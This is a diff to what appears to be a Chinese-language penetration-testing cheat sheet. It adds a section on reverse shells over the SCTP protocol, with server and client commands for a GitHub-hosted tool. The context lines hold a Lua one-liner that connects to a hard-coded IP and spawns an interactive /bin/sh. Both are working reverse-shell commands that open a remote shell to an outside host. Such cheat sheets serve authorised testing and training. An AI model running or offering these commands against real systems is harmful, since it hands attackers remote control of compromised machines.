@@ -432,6 +432,15 @@ lua
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 ```
 
+stcp协议反弹shell
+```
+# https://github.com/srat1999/sctp-shell
+# server 
+sudo ./scp-shell -s -lp 443 -a 192.168.0.189
+# client
+./scp-shell -a 192.168.0.189 -lp 56738 -rp 443
+```
+
 ### 内网文件的传输和下载   
 wput 
 ```
